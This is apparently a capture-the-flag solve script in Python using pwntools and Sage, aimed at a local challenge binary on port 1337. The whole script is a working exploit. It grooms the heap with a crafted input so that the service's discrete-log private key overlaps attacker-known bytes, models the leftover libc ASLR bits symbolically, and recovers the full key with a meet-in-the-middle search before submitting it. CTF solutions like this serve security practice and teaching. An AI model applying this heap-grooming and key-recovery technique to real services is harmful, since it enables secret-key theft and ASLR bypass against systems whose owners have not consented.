#!/usr/bin/env python3
from pwn import *
from tqdm import tqdm
from sage.all import *
from Crypto.Util.number import *

context.terminal = "pwn-client.sh"
context.log_level = "debug"

exe = context.binary = ELF(args.EXE or "../src/chall")
g = 2
p = int(
    "C2F2E0F7EC137C1F4F67D5B4276756FCDA5D5DAADDE9993AD2289D7CA855F50BCEC64FE5"
    "859C503A654F32422C5C02B5083BC83DB66EECBD347B971C0ACEF5A387C5E90FCFD25F87"
    "F565752574CC4D72E1AFE0E09A1FBFDE1F1960A56226523BD67B0E7FDE83FE53F85AC61D"
    "94AB52D837CCC1120F22D58CA79334E23B66AD23B1CB493F5DC8E2B7",
    16,
)
q = (p - 1) // 2


def start():
    return connect("localhost", 1337)


def get_public_key(conn):
    conn.sendlineafter(b"> ", b"1")
    return int(
        conn.recvline_startswith(b"Public Key").decode().split(":")[-1].strip(), 16
    )


def submit_answer(conn, guess):
    conn.sendlineafter(b"> ", b"3")
    conn.sendlineafter(b"(hex):", guess)


def to_little_bytes(val, size):
    return val.to_bytes(size, "little")


def solve():
    conn = start()
    _ = conn.recvline_startswith(b"Public Key")
    gen = cyclic_gen(n=8, alphabet="ABCDEF0123456789")

    # set heap up so we occupy as many bits of privkey as possible
    guess = gen.get(0x6E0)
    submit_answer(conn, guess)

    # since pubkey changes everytime we call it, we have to do this wtwice
    pubkey1 = get_public_key(conn)
    pubkey2 = get_public_key(conn)

    # in this path, we are left with 28bits of libc ASLR and 8 bits from one
    # byte we couldn't fill with a known value.
    R = PolynomialRing(ZZ, "L1,L2,B")
    L1, L2, B = R.gens()

    # now we recreate what the private key was, based on our knowledge of its
    # constituent parts.
    lower = to_little_bytes(pubkey1, 0x88) + p64(0x481)
    mid = p64(0) + p64(0) + bytes([int(x, 16) for x in guess[32 : 1072 + 7 * 8 + 7]])
    upper = (
        p64(0x480)
        + p64(0x380)
        + to_little_bytes(int(pow(g, int(guess, 16), p)), 0x88)
        + to_little_bytes(int(guess[: 0x2E8 * 2], 16), 0x2E8)
        + p64(0x500)
    )
    l_lower = len(lower) * 8
    l_mid = len(mid) * 8
    privkey_symbolic = (
        int.from_bytes(lower, "little")
        + pow(2, l_lower) * int.from_bytes(b"\x20\x0b", "little")
        + pow(2, l_lower + 12) * L1  # L1: low 10 bits of libc ASLR
        + pow(2, l_lower + 12 + 10) * L2  # L2: next 18 bits of libc ASLR
        + pow(2, l_lower + 12 + 10 + 18) * int.from_bytes(b"\x7f\x00\x00", "little")
        + pow(2, l_lower + 64) * int.from_bytes(b"\x20\x0b", "little")
        + pow(2, l_lower + 64 + 12) * L1  # L1: low 10 bits of libc ASLR
        + pow(2, l_lower + 64 + 12 + 10) * L2  # L2: next 18 bits of libc ASLR
        + pow(2, l_lower + 64 + 12 + 10 + 18)
        * int.from_bytes(b"\x7f\x00\x00", "little")
        + pow(2, l_lower + 128) * int.from_bytes(mid, "little")
        + pow(2, l_lower + 128 + l_mid) * B
        + pow(2, l_lower + 128 + l_mid + 8) * int.from_bytes(upper, "little")
    )

    # this reconstruction gives us a symbolic representation of the private key as
    # a * L1 + b * L2 + c * B + d.
    OrderMod = Integers(q)
    a, b, c, d = (
        OrderMod(int(privkey_symbolic.coefficient(L1))),
        OrderMod(int(privkey_symbolic.coefficient(L2))),
        OrderMod(int(privkey_symbolic.coefficient(B))),
        OrderMod(int(privkey_symbolic.constant_coefficient())),
    )
    BaseField = GF(p)
    g_field = BaseField(g)
    pubkey2_field = BaseField(pubkey2)

    # since pow(g, a * L1 + b * L2 + c * B + d) == pubkey2, then
    # pow(g, b * L2) == pubkey2 * pow(g, -d - c * B - a * L1),
    #
    # there are 18 bits of unknown on the LHS and 18bits of unknown on the RHS,
    # so we can meet-in-the-middle rather than doing the full 36bit brute.
    rhs_mem = {}
    for l1_val in tqdm(range(2**10)):
        for b_val in range(2**8):
            rhs_mem[pubkey2_field * pow(g_field, (-d - c * b_val - a * l1_val))] = (
                l1_val,
                b_val,
            )
    privkey_val = 0
    for l2_val in tqdm(range(2**18)):
        target = pow(g_field, b * l2_val)
        if target in rhs_mem:
            print("found")
            l1, b_found = rhs_mem[target]
            privkey_val = privkey_symbolic.subs({L1: l1, L2: l2_val, B: b_found})
            break

    assert pow(g_field, privkey_val) == pubkey2_field
    submit_answer(conn, hex(int(privkey_val))[2:].upper().encode())
    print(conn.recvall())


if __name__ == "__main__":
    solve()
